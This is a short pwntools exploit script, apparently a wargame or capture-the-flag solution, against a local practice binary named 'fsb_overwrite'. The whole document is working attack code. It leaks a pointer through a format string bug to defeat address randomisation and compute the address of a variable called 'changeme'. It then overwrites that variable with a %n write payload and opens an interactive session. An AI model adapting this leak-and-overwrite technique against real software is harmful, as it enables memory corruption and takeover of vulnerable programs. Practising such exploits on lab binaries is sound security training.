# Name: fsb_overwrite.py
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./fsb_overwrite')
elf = ELF('./fsb_overwrite')

fstring = b'%1337c'
fstring += b'%8'

# [1] Get Address of changeme
p.sendline(b'%15$p') # FSB
leaked = int(p.recvline()[:-1], 16)
code_base = leaked - 0x1293
changeme = code_base + elf.symbols['changeme']

slog('code_base', code_base)
slog('changeme', changeme)

fstring = b'%1337c'
fstring += b'%8$n'
fstring = fstring.ljust(16)
fstring += p64(changeme)
p.sendline(fstring)

p.interactive()